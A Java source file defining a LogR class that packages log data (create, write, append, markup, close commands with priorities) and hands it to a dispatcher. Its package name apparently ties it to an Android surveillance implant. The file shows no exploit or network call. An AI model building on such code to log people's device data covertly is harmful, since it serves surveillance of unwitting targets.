package com.ht.RCSAndroidGUI;

import com.ht.RCSAndroidGUI.utils.Utils;

public class LogR {
	private int type;
	private long unique;
	private LogDispatcher disp;
	
	final public static int LOG_CREATE      = 0x1;
	final public static int LOG_ADDITIONAL  = 0x2;
	final public static int LOG_APPEND      = 0x3;
	final public static int LOG_WRITE       = 0x4;
	final public static int LOG_CLOSE       = 0x5;
	final public static int LOG_REMOVE      = 0x6;
	final public static int LOG_REMOVEALL   = 0x7;
	final public static int LOG_WRITEMRK	= 0x8;
	
	final public static int LOG_PRI_MAX     = 0x1;
	final public static int LOG_PRI_STD		= 0x7f;
	final public static int LOG_PRI_MIN     = 0xff;
	
	public LogR(int logType, int priority) {
		unique = Utils.getUniqueId();
		disp = LogDispatcher.self();
		type = logType;
		
		Packet p = new Packet(unique);
		
		p.setType(type);
		p.setPriority(priority);
		p.setCommand(LOG_CREATE);
		
		send(p);
	}

	public LogR(int logType, int priority, byte[] additional) {
		unique = Utils.getUniqueId();
		disp = LogDispatcher.self();
		type = logType;
		
		Packet p = new Packet(unique);
		
		p.setType(type);
		p.setPriority(priority);
		p.setCommand(LOG_CREATE);
		
		send(p);
		
		Packet add = new Packet(unique);
		add.setCommand(LOG_ADDITIONAL);
		add.fill(additional);
		
		send(add);
	}
	
	// Send data to dispatcher
	private void send(Packet p) {
		if (disp == null) {
			disp = LogDispatcher.self();
			
			if (disp == null)
				return;
		}
		
		disp.send(p);
	}
	
	public void write(byte[] data) {
		Packet p = new Packet(unique);
		
		p.setCommand(LOG_WRITE);
		p.fill(data);
		
		send(p);
		return;
	}
	
	public void writeMarkup(byte[] data) {
		Packet p = new Packet(unique);
		
		p.setType(type);
		p.setCommand(LOG_WRITEMRK);
		p.fill(data);
		
		send(p);
		return;
	}
	
	public void append(byte[] data) {
		Packet p = new Packet(unique);
		
		p.setCommand(LOG_APPEND);
		p.fill(data);
		
		send(p);
		return;
	}
	
	public void close() {
		Packet p = new Packet(unique);
		
		p.setCommand(LOG_CLOSE);
		
		send(p);
		return;		
	}
}
